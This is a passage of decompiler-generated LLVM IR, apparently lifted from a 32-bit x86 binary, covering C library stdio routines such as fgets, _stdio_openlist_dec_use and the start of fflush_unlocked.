dec_label_pc_805cb14:                             ; preds = %dec_label_pc_805cb8f, %dec_label_pc_805cb12
  %v0_805cb2a = phi i32 [ 0, %dec_label_pc_805cb12 ], [ %v1_805cb93, %dec_label_pc_805cb8f ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805cb12 ], [ %stack_var_-88.5, %dec_label_pc_805cb8f ]
  %v1_805cb14 = add i32 %v0_805cb2a, -2
  %v6_805cb14 = sub i32 1, %v0_805cb2a
  %v7_805cb14 = and i32 %v6_805cb14, %v0_805cb2a
  %v8_805cb14 = icmp slt i32 %v7_805cb14, 0
  %v9_805cb14 = icmp eq i32 %v1_805cb14, 0
  %v10_805cb14 = icmp slt i32 %v1_805cb14, 0
  %v3_805cb17 = icmp eq i1 %v10_805cb14, %v8_805cb14
  %v4_805cb17 = icmp eq i1 %v9_805cb14, false
  %v5_805cb17 = and i1 %v4_805cb17, %v3_805cb17
  br i1 %v5_805cb17, label %dec_label_pc_805cb2a, label %dec_label_pc_805cb19

dec_label_pc_805cb19:                             ; preds = %dec_label_pc_805cb14
  %v0_805cb19 = load i32, i32* @esp, align 4
  %v2_805cb19 = mul i32 %v0_805cb2a, 4
  %v3_805cb19 = add i32 %v2_805cb19, 68
  %v4_805cb19 = add i32 %v3_805cb19, %v0_805cb19
  %v5_805cb19 = inttoptr i32 %v4_805cb19 to i32*
  %v6_805cb19 = load i32, i32* %v5_805cb19, align 4
  store i32 %v6_805cb19, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805cb21 = trunc i32 %v6_805cb19 to i8
  %v5_805cb21 = add i32 %v4_805cb21, %v0_805cb2a
  %v6_805cb21 = inttoptr i32 %v5_805cb21 to i8*
  store i8 %v1_805cb21, i8* %v6_805cb21, align 1
  %v0_805cb25 = load i32, i32* %eax.global-to-local, align 4
  %v1_805cb25 = urem i32 %v0_805cb25, 256
  br label %dec_label_pc_805cb33

dec_label_pc_805cb2a:                             ; preds = %dec_label_pc_805cb14
  %v5_805cb2c = add i32 %v0_805cb2a, %stack_var_-32.3
  store i32 %v5_805cb2c, i32* %eax.global-to-local, align 4
  %v1_805cb30 = add i32 %v5_805cb2c, -2
  br label %dec_label_pc_805cb33

dec_label_pc_805cb33:                             ; preds = %dec_label_pc_805cb19, %dec_label_pc_805cb2a
  %v0_805cb46 = phi i32 [ %v1_805cb25, %dec_label_pc_805cb19 ], [ %v1_805cb30, %dec_label_pc_805cb2a ]
  store i32 %v0_805cb46, i32* %eax.global-to-local, align 4
  %v5_805cb33 = sub i32 %v0_805cb46, %stack_var_-88.4
  %v11_805cb33 = xor i32 %v0_805cb46, %stack_var_-88.4
  %v12_805cb33 = xor i32 %v5_805cb33, %v0_805cb46
  %v13_805cb33 = and i32 %v12_805cb33, %v11_805cb33
  %v14_805cb33 = icmp slt i32 %v13_805cb33, 0
  %v15_805cb33 = icmp eq i32 %v5_805cb33, 0
  %v16_805cb33 = icmp slt i32 %v5_805cb33, 0
  %v3_805cb37 = icmp ne i1 %v16_805cb33, %v14_805cb33
  %v4_805cb37 = or i1 %v15_805cb33, %v3_805cb37
  br i1 %v4_805cb37, label %dec_label_pc_805cb46, label %dec_label_pc_805cb39

dec_label_pc_805cb39:                             ; preds = %dec_label_pc_805cb33
  %v1_805cb39 = add i32 %v0_805cb46, -9
  %v6_805cb39 = sub i32 8, %v0_805cb46
  %v7_805cb39 = and i32 %v6_805cb39, %v0_805cb46
  %v8_805cb39 = icmp slt i32 %v7_805cb39, 0
  %v9_805cb39 = icmp eq i32 %v1_805cb39, 0
  %v10_805cb39 = icmp slt i32 %v1_805cb39, 0
  %v3_805cb3c = icmp eq i1 %v10_805cb39, %v8_805cb39
  %v4_805cb3c = icmp eq i1 %v9_805cb39, false
  %v5_805cb3c = and i1 %v4_805cb3c, %v3_805cb3c
  br i1 %v5_805cb3c, label %dec_label_pc_805cc01, label %dec_label_pc_805cb46

dec_label_pc_805cb46:                             ; preds = %dec_label_pc_805cb39, %dec_label_pc_805cb33
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805cb33 ], [ %v0_805cb46, %dec_label_pc_805cb39 ]
  %v1_805cb46 = add i32 %v0_805cb46, -1
  store i32 %v1_805cb46, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805cb4f = load i32, i32* @esp, align 4
  %v1_805cb4f = load i32, i32* %ebp.global-to-local, align 4
  %v2_805cb4f = mul i32 %v1_805cb4f, 4
  %v3_805cb4f = add i32 %v0_805cb4f, 80
  %v4_805cb4f = add i32 %v3_805cb4f, %v2_805cb4f
  %v5_805cb4f = inttoptr i32 %v4_805cb4f to i32*
  %v6_805cb4f = load i32, i32* %v5_805cb4f, align 4
  store i32 %v6_805cb4f, i32* %edi.global-to-local, align 4
  %v2_805cb53 = mul i32 %v1_805cb46, 4
  %v4_805cb53 = add i32 %v4_805cb8b, %v2_805cb53
  %v5_805cb53 = inttoptr i32 %v4_805cb53 to i32*
  %v6_805cb53 = load i32, i32* %v5_805cb53, align 4
  store i32 %v6_805cb53, i32* @eax, align 4
  %v9_805cb57 = icmp eq i32 %v6_805cb4f, 8
  br i1 %v9_805cb57, label %dec_label_pc_805cb8f, label %dec_label_pc_805cb5c

dec_label_pc_805cb5c:                             ; preds = %dec_label_pc_805cb46
  %v9_805cb5c = icmp eq i32 %v6_805cb53, 8
  br i1 %v9_805cb5c, label %dec_label_pc_805cb7f, label %dec_label_pc_805cb61

dec_label_pc_805cb61:                             ; preds = %dec_label_pc_805cb5c
  %v12_805cb61 = icmp eq i32 %v6_805cb53, %v6_805cb4f
  br i1 %v12_805cb61, label %dec_label_pc_805cb7f, label %dec_label_pc_805cb65

dec_label_pc_805cb65:                             ; preds = %dec_label_pc_805cb61
  %v1_805cb65 = call i32 @_promoted_size(i32 %v1_805cb46)
  store i32 %v1_805cb65, i32* %ebx.global-to-local, align 4
  %v0_805cb6c = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805cb6c, i32* @eax, align 4
  %v1_805cb6e = call i32 @_promoted_size(i32 %v1_805cb46)
  %v2_805cb73 = sub i32 %v1_805cb65, %v1_805cb6e
  %v8_805cb73 = xor i32 %v1_805cb65, %v1_805cb6e
  %v9_805cb73 = xor i32 %v2_805cb73, %v1_805cb65
  %v10_805cb73 = and i32 %v9_805cb73, %v8_805cb73
  %v11_805cb73 = icmp slt i32 %v10_805cb73, 0
  %v12_805cb73 = icmp eq i32 %v2_805cb73, 0
  %v13_805cb73 = icmp slt i32 %v2_805cb73, 0
  %v3_805cb75 = icmp ne i1 %v13_805cb73, %v11_805cb73
  %v4_805cb75 = or i1 %v12_805cb73, %v3_805cb75
  %v5_805cb75 = zext i1 %v4_805cb75 to i32
  store i32 %v5_805cb75, i32* %eax.global-to-local, align 4
  %v1_805cb7b = icmp eq i1 %v4_805cb75, false
  br i1 %v1_805cb7b, label %dec_label_pc_805cb8f, label %dec_label_pc_805cb65.dec_label_pc_805cb7f_crit_edge

dec_label_pc_805cb65.dec_label_pc_805cb7f_crit_edge: ; preds = %dec_label_pc_805cb65
  %v0_805cb7f.pre = load i32, i32* @esp, align 4
  %v1_805cb7f.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805cb7f

dec_label_pc_805cb7f:                             ; preds = %dec_label_pc_805cb65.dec_label_pc_805cb7f_crit_edge, %dec_label_pc_805cb61, %dec_label_pc_805cb5c
  %v1_805cb7f = phi i32 [ %v1_805cb7f.pre, %dec_label_pc_805cb65.dec_label_pc_805cb7f_crit_edge ], [ %v1_805cb4f, %dec_label_pc_805cb61 ], [ %v1_805cb4f, %dec_label_pc_805cb5c ]
  %v0_805cb7f = phi i32 [ %v0_805cb7f.pre, %dec_label_pc_805cb65.dec_label_pc_805cb7f_crit_edge ], [ %v0_805cb4f, %dec_label_pc_805cb61 ], [ %v0_805cb4f, %dec_label_pc_805cb5c ]
  %v2_805cb7f = mul i32 %v1_805cb7f, 4
  %v3_805cb7f = add i32 %v0_805cb7f, 80
  %v4_805cb7f = add i32 %v3_805cb7f, %v2_805cb7f
  %v5_805cb7f = inttoptr i32 %v4_805cb7f to i32*
  %v6_805cb7f = load i32, i32* %v5_805cb7f, align 4
  store i32 %v6_805cb7f, i32* %eax.global-to-local, align 4
  store i32 %v1_805cb46, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_805cb7f, i32* %v5_805cb53, align 4
  br label %dec_label_pc_805cb8f

dec_label_pc_805cb8f:                             ; preds = %dec_label_pc_805cb65, %dec_label_pc_805cb46, %dec_label_pc_805cb7f
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805cb93 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805cb93 = add i32 %v0_805cb93, 1
  store i32 %v1_805cb93, i32* %ebp.global-to-local, align 4
  %v3_805cb94 = load i32, i32* %v2_805cb94, align 4
  %v1_805cb97 = add i32 %v3_805cb94, 2
  store i32 %v1_805cb97, i32* %eax.global-to-local, align 4
  %v5_805cb9c = icmp slt i32 %v1_805cb93, %v1_805cb97
  br i1 %v5_805cb9c, label %dec_label_pc_805cb14, label %dec_label_pc_805cbca

dec_label_pc_805cba3:                             ; preds = %dec_label_pc_805cb07
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805cba7 = add i32 %tmp76, 38
  %v2_805cba7 = inttoptr i32 %v1_805cba7 to i8*
  store i8 1, i8* %v2_805cba7, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805cbb0 = add i32 %tmp76, 28
  %v2_805cbb0 = inttoptr i32 %v1_805cbb0 to i32*
  %v3_805cbb0 = load i32, i32* %v2_805cbb0, align 4
  %v2_805cbb3 = mul i32 %v3_805cbb0, 4
  %v2_805cbb7 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805cbbe = add i32 %tmp76, 40
  store i32 %v1_805cbbe, i32* %eax.global-to-local, align 4
  %v3_805cbc2 = inttoptr i32 %v1_805cbbe to i16*
  %v4_805cbc2 = call i32 @memcpy(i16* %v3_805cbc2, i32 %v2_805cbb7, i32 %v2_805cbb3)
  store i32 %v4_805cbc2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805cbca

dec_label_pc_805cbca:                             ; preds = %dec_label_pc_805cb8f, %dec_label_pc_805cba3
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805cba3 ], [ %stack_var_-88.5, %dec_label_pc_805cb8f ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_805cbd2 = inttoptr i32 %v1_805c873 to i8*
  %v3_805cbd2 = load i8, i8* %v2_805cbd2, align 1
  %v5_805cbd2 = icmp slt i8 %v3_805cbd2, 0
  store i32 %stack_var_-88.6, i32* %v2_805c86c, align 4
  br i1 %v5_805cbd2, label %dec_label_pc_805cbe2, label %dec_label_pc_805cbdb

dec_label_pc_805cbdb:                             ; preds = %dec_label_pc_805cbca
  %v0_805cbdb = load i32, i32* @esi, align 4
  %v1_805cbdb = add i32 %v0_805cbdb, 1
  store i32 %v1_805cbdb, i32* %eax.global-to-local, align 4
  %v1_805cbde = load i32, i32* @ecx, align 4
  %v2_805cbde = inttoptr i32 %v1_805cbde to i32*
  store i32 %v1_805cbdb, i32* %v2_805cbde, align 4
  br label %dec_label_pc_805cbf5

dec_label_pc_805cbe2:                             ; preds = %dec_label_pc_805cbca
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_805c840, i32* %edx.global-to-local, align 4
  %v0_805cbea = load i32, i32* @esi, align 4
  %v2_805cbea = sub i32 %v0_805cbea, %v4_805c840
  store i32 %v2_805cbea, i32* %esi.global-to-local, align 4
  %v1_805cbec = mul i32 %v2_805cbea, 4
  %v2_805cbec = add i32 %v1_805cbec, 224
  store i32 %v2_805cbec, i32* %eax.global-to-local, align 4
  %v2_805cbf3 = load i32, i32* %arg1, align 4
  %v4_805cbf3 = add i32 %v2_805cbf3, %v2_805cbec
  store i32 %v4_805cbf3, i32* %arg1, align 4
  br label %dec_label_pc_805cbf5

dec_label_pc_805cbf5:                             ; preds = %dec_label_pc_805cbdb, %dec_label_pc_805cbe2
  store i32 %tmp76, i32* @edx, align 4
  %v1_805cbf9 = add i32 %tmp76, 28
  %v2_805cbf9 = inttoptr i32 %v1_805cbf9 to i32*
  %v3_805cbf9 = load i32, i32* %v2_805cbf9, align 4
  store i32 %v3_805cbf9, i32* %eax.global-to-local, align 4
  %v1_805cbfc = add i32 %v3_805cbf9, 2
  br label %dec_label_pc_805cc04

dec_label_pc_805cc01:                             ; preds = %dec_label_pc_805c891, %dec_label_pc_805c92b, %dec_label_pc_805c95e, %dec_label_pc_805c9d9, %dec_label_pc_805c9c5, %dec_label_pc_805c9bc, %dec_label_pc_805cb39, %dec_label_pc_805caf0, %dec_label_pc_805ca3b
  br label %dec_label_pc_805cc04

dec_label_pc_805cc04:                             ; preds = %dec_label_pc_805cbf5, %dec_label_pc_805cc01
  %storemerge6 = phi i32 [ %v1_805cbfc, %dec_label_pc_805cbf5 ], [ -1, %dec_label_pc_805cc01 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_805cc07 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805cc07, i32* @ebx, align 4
  store i32 %v0_805c83f, i32* @esi, align 4
  store i32 %v0_805c83e, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_805cb93, { 0, 2, 1 }
  uselistorder i32 %v2_805cb73, { 1, 2, 0 }
  uselistorder i32 %v1_805cb65, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805cb46, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_805cb39, { 1, 0 }
  uselistorder i32 %v5_805cb33, { 1, 2, 0 }
  uselistorder i32 %v0_805cb46, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_805cb14, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_805cb2a, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_805caa5, { 1, 2, 0 }
  uselistorder i32 %v1_805ca7b, { 1, 2, 0 }
  uselistorder i32 %v0_805caa5, { 2, 0, 1, 3 }
  uselistorder i32 %v2_805ca41, { 1, 0 }
  uselistorder i32 %v1_805ca2e, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_805ca37, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_805ca21, { 0, 2, 3, 1 }
  uselistorder i32 %v6_805ca17, { 1, 0 }
  uselistorder i32 %v1_805c9f9, { 1, 0 }
  uselistorder i32 %v0_805ca17.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_805c9dc, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_805c9d3, { 1, 2, 0 }
  uselistorder i32 %v0_805c999, { 1, 0 }
  uselistorder i32 %v1_805c98b, { 1, 0 }
  uselistorder i32 %v1_805c986, { 0, 1, 3, 2 }
  uselistorder i32 %v6_805c984, { 2, 0, 1 }
  uselistorder i32 %v0_805c9a6, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_805c941, { 1, 2, 0 }
  uselistorder i32 %v0_805c919, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v0_805c90c.lcssa, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_805c905.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_805c90f, { 1, 2, 0 }
  uselistorder i32 %v6_805c90d, { 0, 2, 1 }
  uselistorder i32 %v1_805c90c, { 0, 2, 3, 1 }
  uselistorder i32 %v3_805c905, { 2, 1, 0 }
  uselistorder i32 %v1_805c8fd, { 1, 0 }
  uselistorder i32 %v1_805c905137, { 0, 3, 4, 1, 2 }
  uselistorder i32 %v0_805c8f3, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_805c8e3, { 1, 0, 3, 2 }
  uselistorder i32 %v1_805c8b9, { 0, 2, 1 }
  uselistorder i32 %v0_805c8a6, { 2, 0, 1 }
  uselistorder i32 %v4_805c840, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 36, 32, 31, 33, 34, 37, 35, 0, 43, 38, 39, 40, 41, 42, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 3, 0, 1, 2 }
  uselistorder i32 -134666847, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_806da69.702 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805cc04, { 1, 0 }
  uselistorder label %dec_label_pc_805cc01, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_805cbf5, { 1, 0 }
  uselistorder label %dec_label_pc_805cbca, { 1, 0 }
  uselistorder label %dec_label_pc_805cb8f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805cb33, { 1, 0 }
  uselistorder label %dec_label_pc_805cb07, { 1, 0 }
  uselistorder label %dec_label_pc_805ca6f, { 1, 0 }
  uselistorder label %dec_label_pc_805ca3b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ca12, { 1, 0 }
  uselistorder label %dec_label_pc_805c9e9, { 1, 0 }
  uselistorder label %dec_label_pc_805c9b0, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805c953, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805c90c, { 1, 0 }
  uselistorder label %dec_label_pc_805c8fd, { 1, 0 }
  uselistorder label %dec_label_pc_805c8f3, { 1, 0 }
  uselistorder label %dec_label_pc_805c8dc, { 1, 0 }
  uselistorder label %dec_label_pc_805c8dc.outer, { 2, 0, 1 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805cd2c = load i32, i32* @edi, align 4
  %v0_805cd2d = load i32, i32* @esi, align 4
  %v0_805cd2e = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805cd36 = add i32 %arg3, 52
  %v2_805cd36 = inttoptr i32 %v1_805cd36 to i32*
  %v3_805cd36 = load i32, i32* %v2_805cd36, align 4
  store i32 %v3_805cd36, i32* @edi, align 4
  %v1_805cd39 = icmp eq i32 %v3_805cd36, 0
  %v1_805cd3b = icmp eq i1 %v1_805cd39, false
  br i1 %v1_805cd3b, label %entry.dec_label_pc_805cd5c_crit_edge, label %dec_label_pc_805cd3d

entry.dec_label_pc_805cd5c_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805cd5c

dec_label_pc_805cd3d:                             ; preds = %entry
  %v1_805cd3d = add i32 %arg3, 56
  store i32 %v1_805cd3d, i32* @ebx, align 4
  %v4_805cd4c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134586897, i32 %v1_805cd3d)
  %v0_805cd51 = load i32, i32* @ebx, align 4
  %v1_805cd54 = call i32 @pthread_mutex_lock(i32 %v0_805cd51)
  %v0_805cd5d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805cd5c

dec_label_pc_805cd5c:                             ; preds = %entry.dec_label_pc_805cd5c_crit_edge, %dec_label_pc_805cd3d
  %v0_805cd5d = phi i32 [ %arg3, %entry.dec_label_pc_805cd5c_crit_edge ], [ %v0_805cd5d.pre, %dec_label_pc_805cd3d ]
  %v0_805cd5c = load i32, i32* @edx, align 4
  %v4_805cd66 = inttoptr i32 %arg1 to i8*
  %v5_805cd66 = call i32 @__GI_fgets_unlocked(i8* %v4_805cd66, i32 %arg2, i32 %v0_805cd5d, i32 %v0_805cd5c)
  store i32 %v5_805cd66, i32* @ebx, align 4
  br i1 %v1_805cd3b, label %dec_label_pc_805cd85, label %dec_label_pc_805cd74

dec_label_pc_805cd74:                             ; preds = %dec_label_pc_805cd5c
  %v3_805cd7d = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  %v0_805cd88.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805cd85

dec_label_pc_805cd85:                             ; preds = %dec_label_pc_805cd5c, %dec_label_pc_805cd74
  %v0_805cd88 = phi i32 [ %v5_805cd66, %dec_label_pc_805cd5c ], [ %v0_805cd88.pre, %dec_label_pc_805cd74 ]
  store i32 %v0_805cd2e, i32* @ebx, align 4
  store i32 %v0_805cd2d, i32* @esi, align 4
  store i32 %v0_805cd2c, i32* @edi, align 4
  ret i32 %v0_805cd88

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805cd85, { 1, 0 }
  uselistorder label %dec_label_pc_805cd5c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v6_805cf08 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134586897, i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  %v2_805cf14 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  %v0_805cf19 = load i32, i32* @global_var_807b688.681, align 8
  %v8_805cf21 = icmp eq i32 %v0_805cf19, 1
  %v1_805cf22 = icmp eq i1 %v8_805cf21, false
  br i1 %v1_805cf22, label %dec_label_pc_805cfb9, label %dec_label_pc_805cf28

dec_label_pc_805cf28:                             ; preds = %entry
  %v0_805cf28 = load i32, i32* @global_var_807b68c.682, align 4
  %tmp30 = icmp slt i32 %v0_805cf28, 1
  br i1 %tmp30, label %dec_label_pc_805cfb9, label %dec_label_pc_805cf35

dec_label_pc_805cf35:                             ; preds = %dec_label_pc_805cf28
  store i32 0, i32* @esi, align 4
  %v6_805cf47 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 134586897, i32 ptrtoint (i32* @global_var_8074d80.691 to i32))
  %v2_805cf53 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d80.691 to i32))
  %v0_805cf58 = load i32, i32* bitcast (i32** @global_var_8074d7c.667 to i32*), align 4
  store i32 %v0_805cf58, i32* %edx.global-to-local, align 4
  %v1_805cf9a5 = icmp eq i32 %v0_805cf58, 0
  %v1_805cf9c12 = icmp eq i1 %v1_805cf9a5, false
  br i1 %v1_805cf9c12, label %dec_label_pc_805cf63, label %dec_label_pc_805cf9e

dec_label_pc_805cf63:                             ; preds = %dec_label_pc_805cf35, %dec_label_pc_805cf98
  %v1_805cf6316.in = phi i32 [ %v0_805cf98, %dec_label_pc_805cf98 ], [ %v0_805cf58, %dec_label_pc_805cf35 ]
  %v1_805cf6316 = inttoptr i32 %v1_805cf6316.in to i16*
  %v2_805cf63 = load i16, i16* %v1_805cf6316, align 2
  %v1_805cf66 = add i32 %v1_805cf6316.in, 32
  %v2_805cf66 = inttoptr i32 %v1_805cf66 to i32*
  %v3_805cf66 = load i32, i32* %v2_805cf66, align 4
  store i32 %v3_805cf66, i32* @ebx, align 4
  %v1_805cf69 = and i16 %v2_805cf63, -32720
  %v6_805cf6e = icmp eq i16 %v1_805cf69, 48
  br i1 %v6_805cf6e, label %dec_label_pc_805cf77, label %dec_label_pc_805cf73

dec_label_pc_805cf73:                             ; preds = %dec_label_pc_805cf63
  store i32 %v1_805cf6316.in, i32* @esi, align 4
  br label %dec_label_pc_805cf98

dec_label_pc_805cf77:                             ; preds = %dec_label_pc_805cf63
  %v0_805cf77 = load i32, i32* @esi, align 4
  %v1_805cf77 = icmp eq i32 %v0_805cf77, 0
  %v1_805cf79 = icmp eq i1 %v1_805cf77, false
  br i1 %v1_805cf79, label %dec_label_pc_805cf83, label %dec_label_pc_805cf7b

dec_label_pc_805cf7b:                             ; preds = %dec_label_pc_805cf77
  store i32 %v3_805cf66, i32* bitcast (i32** @global_var_8074d7c.667 to i32*), align 4
  br label %dec_label_pc_805cf86

dec_label_pc_805cf83:                             ; preds = %dec_label_pc_805cf77
  %v2_805cf83 = add i32 %v0_805cf77, 32
  %v3_805cf83 = inttoptr i32 %v2_805cf83 to i32*
  store i32 %v3_805cf66, i32* %v3_805cf83, align 4
  %v0_805cf86.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805cf86

dec_label_pc_805cf86:                             ; preds = %dec_label_pc_805cf7b, %dec_label_pc_805cf83
  %v0_805cf8f = phi i32 [ %v1_805cf6316.in, %dec_label_pc_805cf7b ], [ %v0_805cf86.pre, %dec_label_pc_805cf83 ]
  %v1_805cf86 = add i32 %v0_805cf8f, 1
  %v2_805cf86 = inttoptr i32 %v1_805cf86 to i8*
  %v3_805cf86 = load i8, i8* %v2_805cf86, align 1
  %v4_805cf86 = and i8 %v3_805cf86, 32
  %v5_805cf86 = icmp eq i8 %v4_805cf86, 0
  br i1 %v5_805cf86, label %dec_label_pc_805cf98, label %dec_label_pc_805cf8c

dec_label_pc_805cf8c:                             ; preds = %dec_label_pc_805cf86
  %v2_805cf90 = call i32 @free(i32 %v0_805cf8f)
  br label %dec_label_pc_805cf98

dec_label_pc_805cf98:                             ; preds = %dec_label_pc_805cf86, %dec_label_pc_805cf73, %dec_label_pc_805cf8c
  %v0_805cf98 = load i32, i32* @ebx, align 4
  store i32 %v0_805cf98, i32* %edx.global-to-local, align 4
  %v1_805cf9a = icmp eq i32 %v0_805cf98, 0
  %v1_805cf9c = icmp eq i1 %v1_805cf9a, false
  br i1 %v1_805cf9c, label %dec_label_pc_805cf63, label %dec_label_pc_805cf9e

dec_label_pc_805cf9e:                             ; preds = %dec_label_pc_805cf98, %dec_label_pc_805cf35
  %v4_805cfa7 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-40, i32 1)
  store i32 0, i32* @global_var_807b68c.682, align 4
  %v0_805cfb9.pre = load i32, i32* @global_var_807b688.681, align 8
  br label %dec_label_pc_805cfb9

dec_label_pc_805cfb9:                             ; preds = %dec_label_pc_805cf28, %entry, %dec_label_pc_805cf9e
  %v0_805cfb9 = phi i32 [ %v0_805cf19, %dec_label_pc_805cf28 ], [ %v0_805cf19, %entry ], [ %v0_805cfb9.pre, %dec_label_pc_805cf9e ]
  %v1_805cfbe = add i32 %v0_805cfb9, -1
  store i32 %v1_805cfbe, i32* @global_var_807b688.681, align 8
  %v4_805cfcd = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  ret i32 %v4_805cfcd

; uselistorder directives
  uselistorder i32 %v0_805cf98, { 1, 2, 0 }
  uselistorder i32 %v1_805cf6316.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805cf19, { 1, 2, 0 }
  uselistorder i32* bitcast (i32** @global_var_8074d7c.667 to i32*), { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder label %dec_label_pc_805cfb9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805cf98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805cf86, { 1, 0 }
  uselistorder label %dec_label_pc_805cf63, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_805cfd8 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_805cfdb = load i32, i32* @edi, align 4
  %v0_805cfdc = load i32, i32* @esi, align 4
  %v0_805cfdd = load i32, i32* @ebx, align 4
  %v4_805cfe1 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805cfe1, i32* @ebx, align 4
  %v10_805cfe5 = icmp eq i16* %arg1, inttoptr (i32 134696316 to i16*)
  br i1 %v10_805cfe5, label %dec_label_pc_805cff9, label %dec_label_pc_805cfed

dec_label_pc_805cfed:                             ; preds = %entry
  %v2_805cfed = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_805cff3 = icmp eq i1 %v2_805cfed, false
  br i1 %v1_805cff3, label %dec_label_pc_805d0f1, label %dec_label_pc_805cff9

dec_label_pc_805cff9:                             ; preds = %dec_label_pc_805cfed, %entry
  store i32 0, i32* @edi, align 4
  %v2_805d006 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805d006, i32* @ebx, align 4
  %v5_805d00b = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  %v2_805d017 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
